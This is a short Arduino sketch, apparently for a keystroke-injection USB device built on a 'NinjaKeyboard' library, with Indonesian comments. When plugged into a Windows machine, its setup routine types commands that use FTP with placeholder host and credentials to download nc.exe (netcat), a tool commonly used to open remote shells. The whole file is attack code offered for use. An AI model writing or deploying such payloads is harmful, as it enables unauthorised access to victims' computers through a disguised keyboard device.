#include <NinjaKeyboard.h>

EthicNinjaKeyboard en;

void setup()
{
  //Inisialisasi program
  en.init(1500);
  //Download single file
  en.winFTP("get","user_ftp","pass_ftp","host_ftp", "port_ftp","nc.exe");
}

void loop() {
  
}

